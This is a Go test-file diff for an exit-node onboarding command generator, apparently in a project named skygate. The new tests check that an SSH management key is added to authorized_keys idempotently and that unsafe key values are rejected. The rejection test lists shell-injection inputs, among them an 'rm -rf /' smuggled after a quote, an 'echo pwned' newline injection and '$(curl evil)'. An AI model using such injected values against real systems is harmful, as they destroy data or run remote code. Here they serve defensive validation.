@@ -60,7 +60,7 @@ func TestIsSafeNodeName_LengthBoundary(t *testing.T) {
 }
 
 func TestExitNodeRegisterCommand_Shape(t *testing.T) {
-	cmd := exitNodeRegisterCommand("https://head.example.com", "tskey-auth-abc123", "relay-4")
+	cmd := exitNodeRegisterCommand("https://head.example.com", "tskey-auth-abc123", "relay-4", "")
 	for _, want := range []string{
 		"--login-server=https://head.example.com",
 		"--authkey=tskey-auth-abc123",
@@ -82,10 +82,63 @@ func TestExitNodeRegisterCommand_Shape(t *testing.T) {
 	if strings.Contains(cmd, "--login-server= \\") {
 		t.Errorf("command renders an empty --login-server:\n%s", cmd)
 	}
+	// Without a management key the command keeps the pre-B310 shape: no
+	// authorized_keys step and no sixth step.
+	if strings.Contains(cmd, "authorized_keys") {
+		t.Errorf("an empty management key must NOT render an authorized_keys step:\n%s", cmd)
+	}
+	if !strings.Contains(cmd, "# 5. вернуться сюда") {
+		t.Errorf("without a management key the last step stays #5:\n%s", cmd)
+	}
+}
+
+// TestExitNodeRegisterCommand_B310CarriesTheManagementKey pins the onboarding half
+// of B310: a new relay is given skygate's own public key in the same paste, so
+// management can go over the tailnet from the first sync.
+func TestExitNodeRegisterCommand_B310CarriesTheManagementKey(t *testing.T) {
+	const key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7 test@skygate"
+	cmd := exitNodeRegisterCommand("https://head.example.com", "tskey-auth-abc123", "relay-4", key)
+	if !strings.Contains(cmd, "authorized_keys") {
+		t.Fatalf("the management key must render an authorized_keys step:\n%s", cmd)
+	}
+	if !strings.Contains(cmd, key) {
+		t.Errorf("the key itself must be embedded verbatim:\n%s", cmd)
+	}
+	// Idempotent: a re-run must not append the key twice.
+	if !strings.Contains(cmd, "grep -qF '"+key+"'") {
+		t.Errorf("the step must be idempotent (grep -qF before appending):\n%s", cmd)
+	}
+	// Step numbering keeps the "come back and press Re-sync" step last.
+	if !strings.Contains(cmd, "# 5. разрешить skygate управлять этим узлом по SSH") {
+		t.Errorf("the key step should be step 5:\n%s", cmd)
+	}
+	if !strings.Contains(cmd, "# 6. вернуться сюда") {
+		t.Errorf("the Re-sync step must be renumbered to 6:\n%s", cmd)
+	}
+}
+
+// TestExitNodeAuthorizedKeyStep_RefusesUnsafeKeys: the value is rendered into a
+// root shell, so the same gate the node name gets applies here.
+func TestExitNodeAuthorizedKeyStep_RefusesUnsafeKeys(t *testing.T) {
+	for _, bad := range []string{
+		"",
+		"   ",
+		"ssh-ed25519 AAAA'; rm -rf / #",
+		"ssh-ed25519 AAAA\necho pwned",
+		"ssh-ed25519 $(curl evil)",
+		"not-a-key at all",
+	} {
+		if got := exitNodeAuthorizedKeyStep(bad); got != "" {
+			t.Errorf("exitNodeAuthorizedKeyStep(%q) = %q; want empty", bad, got)
+		}
+	}
+	if got := exitNodeAuthorizedKeyStep("ssh-ed25519 AAAA test@host"); got == "" {
+		t.Errorf("a normal key must be accepted")
+	}
 }
 
 func TestExitNodeRegisterCommand_EmptyHostnamePlaceholder(t *testing.T) {
-	cmd := exitNodeRegisterCommand("", "key", "")
+	cmd := exitNodeRegisterCommand("", "key", "", "")
 	// No hostname → no hostnamectl step, and the tailscale line carries a
 	// visible placeholder instead of an empty value.
 	if strings.Contains(cmd, "hostnamectl set-hostname") {
